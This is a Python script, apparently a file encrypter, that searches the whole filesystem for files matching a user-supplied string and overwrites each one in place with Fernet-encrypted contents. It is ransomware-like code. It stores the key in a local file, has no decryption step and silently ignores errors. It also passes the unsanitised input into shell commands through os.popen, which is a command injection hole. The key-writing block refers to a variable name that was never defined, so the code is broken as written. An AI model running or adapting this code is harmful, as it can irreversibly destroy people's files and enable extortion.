import os
import queue
import platform
from cryptography.fernet import Fernet

key=Fernet.generate_key()

with open('EncryptionKey.key','wb') as enckeyfd:
    encfd.write(key)
    encfd.close()

f= Fernet(key)
print('File encrypter is running! :)')
try:
    input = raw_input
except NameError:
    pass


searchinput=input('Enter the search string of the file or files to search and encrypt:\n')

if 'Windows' in platform.system(): 
    dircmd='dir /a /s /b C:\*%s*' % searchinput
    data=os.popen(dircmd)
elif 'Linux' in platform.system():
    findcmd="find / -name *%s* -type f 2>/dev/null" % searchinput
    data=os.popen(findcmd)
else:
    print("OS not found")

print("Searching for files with %s in the name or extension" % searchinput)
paths=queue.Queue()



for line in data:
	paths.put(line.rstrip())

def encryptstage(filepath) :
    global f
    try:
        originalfilefd=open(filepath,'rb')
        originalfiledata=originalfilefd.read()
        originalfilefd.close()
        encrypted=f.encrypt(originalfiledata)
        encryptedfilefd=open(filepath,'wb')
        encryptedfilefd.write(encrypted)
        encryptedfilefd.close()
    except:
        pass
	

while not paths.empty():
	path=paths.get()
	encryptstage(path)
	listpath=os.getcwd()+"/list.txt"
	fd=open(listpath,'a')
	fd.write(path)
	fd.close()
